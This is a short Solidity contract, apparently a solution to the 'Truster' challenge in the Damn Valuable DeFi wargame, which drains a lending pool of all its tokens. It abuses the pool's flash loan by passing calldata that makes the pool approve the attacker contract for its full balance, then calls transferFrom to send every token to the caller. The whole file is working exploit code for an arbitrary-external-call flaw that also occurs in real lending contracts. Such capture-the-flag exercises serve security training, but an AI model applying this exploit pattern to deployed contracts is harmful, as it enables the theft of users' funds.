// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract Attack_Truster {

    address owner;

    function getEmBoyz(address _pool, address _token) public
    {
        owner = msg.sender;
        DamnValuableToken token = DamnValuableToken(_token);
        TrusterLenderPool pool = TrusterLenderPool(_pool);

        pool.flashLoan(token.balanceOf(_pool), _pool, _token, abi.encodeWithSignature("approve(address,uint256)", address(this), token.balanceOf(_pool)));

        DamnValuableToken(token).transferFrom(_pool, owner, DamnValuableToken(token).balanceOf(_pool));
    }
}